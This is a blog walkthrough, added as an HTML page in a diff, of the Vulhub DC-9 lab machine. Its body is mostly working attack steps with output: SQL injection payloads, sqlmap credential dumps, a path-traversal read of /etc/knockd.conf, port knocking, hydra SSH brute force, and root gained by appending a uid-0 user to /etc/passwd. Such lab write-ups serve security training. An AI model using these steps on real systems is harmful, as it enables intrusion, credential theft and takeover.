@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Vulhub DC9 靶场 | w8nn9z Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="Vulhub DC9 靶场 - w8nn9z Blog">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/penetration/vulhubdc9/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="sha256-EqVinQvl&#43;IX9lG13JX5V90An7So1FEop4tsT&#43;PYrXzU=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/penetration/vulhubdc9/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/search" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/posts" title="文章">
+                    <span>文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Vulhub DC9 靶场
+    </h1>
+    <div class="post-meta"><span title='2025-09-30 00:00:00 +0000 UTC'>September 30, 2025</span>
+
+</div>
+  </header> 
+
+  <div class="post-content"><p>访问web服务，<code>search</code>存在SQL注入点：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39; union select 1,2,3,4,5,group_concat(table_name) from information_schema.tables where table_schema=database() #
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ID: 1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Name: 2 3
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Position: 4
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Phone No: 5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Email: StaffDetails,Users
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0&#39;</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,group_concat(<span style="color:#66d9ef">column_name</span>) <span style="color:#66d9ef">from</span> information_schema.columns <span style="color:#66d9ef">where</span> <span style="color:#66d9ef">table_name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Users&#34;</span> <span style="color:#f92672">#</span>
+</span></span><span style="display:flex;"><span>ID: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Name: <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Position</span>: <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>Phone <span style="color:#66d9ef">No</span>: <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>Email: UserID,Username,Password
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39; union select 1,2,3,group_concat(Username),5,group_concat(Password) from Users #
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ID: 1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Name: 2 3
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Position: admin
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Phone No: 5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Email: 
+</span></span></span></code></pre></div><p>在线网站 <a href="https://www.somd5.com/">https://www.somd5.com/</a> 解md5：</p>
+<pre tabindex="0"><code>856f5de590ef37314e7c3bdf6f8a66dc
+transorbital1
+</code></pre><p>登录后发现存在<code>file</code>参数的文件包含，本题对端口进行了隐藏，需要通过端口敲门来使ssh服务对敲门成功的ip开放，先获取对应配置文件<code>/etc/knockd.conf</code>：</p>
+<pre tabindex="0"><code>http://127.0.0.1:8085/manage.php?file=../../../../etc/knockd.conf
+
+[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn 
+</code></pre><p>依次访问3个端口：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc 61.139.2.139 <span style="color:#ae81ff">7469</span>
+</span></span><span style="display:flex;"><span>nc 61.139.2.139 <span style="color:#ae81ff">8475</span>
+</span></span><span style="display:flex;"><span>nc 61.139.2.139 <span style="color:#ae81ff">9842</span>
+</span></span></code></pre></div><p>nmap再次扫描靶机ip：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -A -p 1-65535 61.139.2.139    
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-09-30 10:08 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 61.139.2.139
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00027s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> a2:b3:38:74:32:74:0b:c5:16:dc:13:de:cb:9b:8a:c3 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 06:5c:93:87:15:54:68:6b:88:91:55:cf:f8:9a:ce:40 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> e4:2c:88:da:88:63:26:8c:93:d5:f7:63:2b:a3:eb:ab <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.38 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-title: Example.com - Staff Details - Welcome
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.38 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>通过sqlmap获取用户信息爆破ssh：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python sqlmap.py -r sql.txt -dbs --batch
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">25</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span>] [<span style="color:#66d9ef">INFO</span>] fetching database names
+</span></span><span style="display:flex;"><span>available databases [<span style="color:#ae81ff">3</span>]<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>[*] information_schema
+</span></span><span style="display:flex;"><span>[*] Staff
+</span></span><span style="display:flex;"><span>[*] users
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>python sqlmap.py -r sql.txt -D users -T UserDetails --columns --batch
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">31</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">11</span>] [<span style="color:#66d9ef">INFO</span>] fetching columns <span style="color:#66d9ef">for</span> table <span style="color:#e6db74">&#39;UserDetails&#39;</span> <span style="color:#66d9ef">in</span> database <span style="color:#e6db74">&#39;users&#39;</span>
+</span></span><span style="display:flex;"><span>Database<span style="color:#960050;background-color:#1e0010">:</span> users
+</span></span><span style="display:flex;"><span>Table<span style="color:#960050;background-color:#1e0010">:</span> UserDetails
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">6</span> columns]
+</span></span><span style="display:flex;"><span>+-----------+-----------------+
+</span></span><span style="display:flex;"><span>| Column    | Type            |
+</span></span><span style="display:flex;"><span>+-----------+-----------------+
+</span></span><span style="display:flex;"><span>| firstname | varchar(<span style="color:#ae81ff">30</span>)     |
+</span></span><span style="display:flex;"><span>| id        | int(<span style="color:#ae81ff">6</span>) unsigned |
+</span></span><span style="display:flex;"><span>| lastname  | varchar(<span style="color:#ae81ff">30</span>)     |
+</span></span><span style="display:flex;"><span>| password  | varchar(<span style="color:#ae81ff">20</span>)     |
+</span></span><span style="display:flex;"><span>| reg_date  | timestamp       |
+</span></span><span style="display:flex;"><span>| username  | varchar(<span style="color:#ae81ff">30</span>)     |
+</span></span><span style="display:flex;"><span>+-----------+-----------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>python sqlmap.py -r sql.txt -D users -T UserDetails -C username,password --dump --batch
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">32</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">27</span>] [<span style="color:#66d9ef">INFO</span>] fetching entries of column(s) <span style="color:#e6db74">&#39;password,username&#39;</span> <span style="color:#66d9ef">for</span> table <span style="color:#e6db74">&#39;UserDetails&#39;</span> <span style="color:#66d9ef">in</span> database <span style="color:#e6db74">&#39;users&#39;</span>
+</span></span><span style="display:flex;"><span>Database<span style="color:#960050;background-color:#1e0010">:</span> users
+</span></span><span style="display:flex;"><span>Table<span style="color:#960050;background-color:#1e0010">:</span> UserDetails
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">17</span> entries]
+</span></span><span style="display:flex;"><span>+-----------+---------------+
+</span></span><span style="display:flex;"><span>| username  | password      |
+</span></span><span style="display:flex;"><span>+-----------+---------------+
+</span></span><span style="display:flex;"><span>| marym     | 3kfs86sfd     |
+</span></span><span style="display:flex;"><span>| julied    | 468sfdfsd2    |
+</span></span><span style="display:flex;"><span>| fredf     | 4sfd87sfd1    |
+</span></span><span style="display:flex;"><span>| barneyr   | RocksOff      |
+</span></span><span style="display:flex;"><span>| tomc      | TC&amp;TheBoyz    |
+</span></span><span style="display:flex;"><span>| jerrym    | B8m<span style="color:#75715e">#48sd      |</span>
+</span></span><span style="display:flex;"><span>| wilmaf    | Pebbles       |
+</span></span><span style="display:flex;"><span>| bettyr    | BamBam01      |
+</span></span><span style="display:flex;"><span>| chandlerb | UrAG0D!       |
+</span></span><span style="display:flex;"><span>| joeyt     | Passw0rd      |
+</span></span><span style="display:flex;"><span>| rachelg   | yN72<span style="color:#75715e">#dsd      |</span>
+</span></span><span style="display:flex;"><span>| rossg     | ILoveRachel   |
+</span></span><span style="display:flex;"><span>| monicag   | 3248dsds7s    |
+</span></span><span style="display:flex;"><span>| phoebeb   | smellycats    |
+</span></span><span style="display:flex;"><span>| scoots    | YR3BVxxxw87   |
+</span></span><span style="display:flex;"><span>| janitor   | Ilovepeepee   |
+</span></span><span style="display:flex;"><span>| janitor2  | Hawaii-Five-<span style="color:#ae81ff">0</span> |
+</span></span><span style="display:flex;"><span>+-----------+---------------+
+</span></span></code></pre></div><p>hydra爆破ssh：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ hydra -L username.txt -P passwords.txt ssh://61.139.2.139 -vV -s <span style="color:#ae81ff">22</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 61.139.2.139   login: chandlerb   password: UrAG0D!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 61.139.2.139   login: joeyt   password: Passw0rd
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 61.139.2.139   login: janitor   password: Ilovepeepee
+</span></span></code></pre></div><p>janitor目录下存在新的密码字典，再爆破一次ssh：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>janitor@dc-9:~$ cat .secrets-for-putin/passwords-found-on-post-it-notes.txt
+</span></span><span style="display:flex;"><span>BamBam01
+</span></span><span style="display:flex;"><span>Passw0rd
+</span></span><span style="display:flex;"><span>smellycats
+</span></span><span style="display:flex;"><span>P0Lic#10-4
+</span></span><span style="display:flex;"><span>B4-Tru3-001
+</span></span><span style="display:flex;"><span>4uGU5T-NiGHts
+</span></span></code></pre></div><p>新的用户fredf：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ hydra -L username.txt -P passwords.txt ssh://61.139.2.139 -vV -s <span style="color:#ae81ff">22</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 61.139.2.139   login: fredf   password: B4-Tru3-001
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 61.139.2.139   login: joeyt   password: Passw0rd
+</span></span></code></pre></div><p><code>sudo -l</code>找到root权限可执行文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>fredf@dc-9:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> fredf on dc-9:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User fredf may run the following commands on dc-9:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /opt/devstuff/dist/test/test
+</span></span></code></pre></div><p>/opt/devstuff/test.py：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len (sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3</span> :
+</span></span><span style="display:flex;"><span>    print (<span style="color:#e6db74">&#34;Usage: python test.py read append&#34;</span>)
+</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>exit (<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> :
+</span></span><span style="display:flex;"><span>    f <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+</span></span><span style="display:flex;"><span>    output <span style="color:#f92672">=</span> (f<span style="color:#f92672">.</span>read())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    f <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;a&#34;</span>)
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(output)
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><p><code>/etc/passwd</code>提权，向其中写入新用户即可提权：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import crypt; print crypt.crypt(&#34;123456&#34;, &#34;$6$salt&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>$6$salt$MktMKPZJ6t59GfxcJU20DwcwQzfMvOlHFVZiOVD71w.igcOo1R7vBYR65JquIQ/7siC7VRpmteKvZmfSkNc69.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;hacker:$6$salt$MktMKPZJ6t59GfxcJU20DwcwQzfMvOlHFVZiOVD71w.igcOo1R7vBYR65JquIQ/7siC7VRpmteKvZmfSkNc69.:0:0:root:/root:/bin/bash&#39;</span> &gt;&gt; /etc/passwd
+</span></span></code></pre></div><p>theflag.txt：</p>
+<pre tabindex="0"><code>███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
+████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
+██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
+██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
+██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
+╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
+                                                                             
+Congratulations - you have done well to get to this point.
+
+Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
+who have taken the time to complete the various DC challenges.
+
+I also want to send out a big thank you to the various members of @m0tl3ycr3w .
+
+They are an inspirational bunch of fellows.
+
+Sure, they might smell a bit, but...just kidding.  :-)
+
+Sadly, all things must come to an end, and this will be the last ever
+challenge in the DC series.
+
+So long, and thanks for all the fish.
+</code></pre><p>参考资料：</p>
+<p><a href="https://wiki.archlinux.org.cn/title/Port_knocking">https://wiki.archlinux.org.cn/title/Port_knocking</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">w8nn9z Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
